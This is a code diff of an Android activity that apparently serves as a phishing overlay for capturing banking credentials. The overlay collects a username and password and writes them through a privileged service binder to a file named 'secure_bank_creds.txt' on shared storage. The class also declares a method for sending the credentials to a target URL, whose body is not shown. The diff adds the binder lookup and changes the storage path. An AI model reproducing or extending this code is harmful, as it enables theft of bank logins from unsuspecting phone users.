@@ -13,6 +13,7 @@ import com.google.android.material.textfield.TextInputEditText;
 import com.google.android.material.textfield.TextInputLayout;
 
 import java.io.IOException;
+import java.util.Objects;
 
 import okhttp3.MediaType;
 import okhttp3.Request;
@@ -23,7 +24,7 @@ import okhttp3.Response;
 public class OverlayActivity extends AppCompatActivity {
     private static final String TAG = "[OverlayActivity]";
     private static final int REQUEST_WRITE_EXTERNAL_STORAGE = 1;
-    private static final String FILE_NAME = "/storage/emulated/0/Downloads/secure_bank_creds.txt";
+    private static final String FILE_NAME = "/storage/emulated/0/secure_bank_creds.txt";
     TextInputEditText usernameEditText;
     TextInputEditText passwordEditText;
     TextInputLayout usernameInputLayout;
@@ -40,6 +41,7 @@ public class OverlayActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         Log.d(TAG, "OVERLAY_ACTIVITY CREATED...");
         setContentView(R.layout.overlay_layout);
+        privilegedService = IUserService.Stub.asInterface(Objects.requireNonNull(getIntent().getExtras()).getBinder("triggerOverlay"));
         usernameEditText = findViewById(R.id.userText);
         passwordEditText = findViewById(R.id.pswdText);
         usernameInputLayout = findViewById(R.id.userLayout);
@@ -75,13 +77,14 @@ public class OverlayActivity extends AppCompatActivity {
 
     private void writeToExternalStorage(String content) {
         Log.d(TAG, "Writing to external storage...");
-        Thread thread = new Thread(() -> {
+        new Thread(() -> {
+            Log.d(TAG,"Thread running...");
             try {
                 privilegedService.writeToFile(FILE_NAME, content);
-            } catch (Exception ignored) {
+            } catch (Exception err) {
+                Log.e(TAG, String.valueOf(err));
             }
-        });
-        thread.start();
+        }).start();
     }
 
     private void sendDataOnline(String username, String password, String targetUrl) {
